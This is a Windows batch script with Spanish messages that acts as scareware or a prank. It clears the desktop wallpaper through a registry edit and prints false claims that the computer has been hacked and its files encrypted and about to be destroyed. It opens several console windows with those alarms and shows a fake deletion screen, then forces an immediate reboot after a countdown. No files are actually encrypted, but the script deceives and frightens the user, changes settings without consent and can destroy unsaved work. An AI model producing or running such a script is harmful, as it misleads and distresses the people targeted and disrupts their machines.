@echo off

REM Dark

REM Fondo de pantalla
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

echo ¡Alerta! Tu sistema ha sido comprometido.
echo Alguien ha logrado acceder a tu red y ha tomado el control de tu computadora.
echo Todos tus archivos han sido cifrados y se eliminarán si no sigues las instrucciones.

REM Escaneo de archivos maliciosos
echo Escaneando tu sistema en busca de malware...
timeout /nobreak 5 >nul

REM Presenta el mensaje
echo ERROR: Se ha detectado actividad maliciosa en tu sistema.
echo Se han encontrado archivos comprometidos. La destrucción es inminente.
timeout /nobreak 3 >nul

REM Inicia un bucle de 15 segundos
set contador=15

REM Abre 5 terminales
start cmd /c "echo ¡Alerta! Tu sistema ha sido comprometido." & echo.
start cmd /c "echo Alguien ha logrado acceder a tu red y ha tomado el control de tu computadora." & echo.
start cmd /c "echo Todos tus archivos han sido cifrados y se eliminarán si no sigues las instrucciones." & echo.
start cmd /c "echo Escaneando tu sistema en busca de malware..." & timeout /nobreak 5 >nul & echo.
start cmd /c "echo ERROR: Se ha detectado actividad maliciosa en tu sistema." & echo.
start cmd /c "echo Se han encontrado archivos comprometidos. La destrucción es inminente." & timeout /nobreak 3 >nul & echo.

REM Desglosa el texto aleatorio
start cmd /c "echo Eliminando sistema... & echo ---------------------------------------- & echo %random% & echo %random% & echo %random% & echo %random% & echo %random% & echo %random% & echo %random% & echo %random% & echo %random% & echo ---------------------------------------- & timeout /nobreak 15 >nul" & echo.

:esperar
echo Reiniciando en %contador% segundos...
ping -n 2 127.0.0.1 > nul
set /a contador-=1
if %contador% gtr 0 goto esperar

REM Reiniciar
shutdown /r /f /t 0
